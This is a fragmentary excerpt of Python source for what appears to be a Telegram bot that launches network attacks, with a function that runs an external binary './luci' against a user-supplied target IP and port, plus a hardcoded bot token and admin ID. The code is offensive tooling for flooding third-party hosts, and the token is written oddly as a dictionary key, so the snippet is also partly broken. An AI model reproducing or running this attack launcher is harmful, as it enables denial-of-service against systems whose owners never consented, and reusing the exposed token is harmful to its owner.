...
BOT_TOKEN = config['7627360849:AAGo9QsMJMeu9bYMZ5jZVRo8BoL-ShAGIcI']
ADMIN_IDS = config['7652929242']
...
def run_attack_command_sync(target_ip, target_port, action):
    if action == 1:
        process = subprocess.Popen(["./luci", target_ip, str(target_port), "1"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
...
def send_owner_info(message):
    owner_message = "This Bot Has Been Developed By @ITS_LUCI"
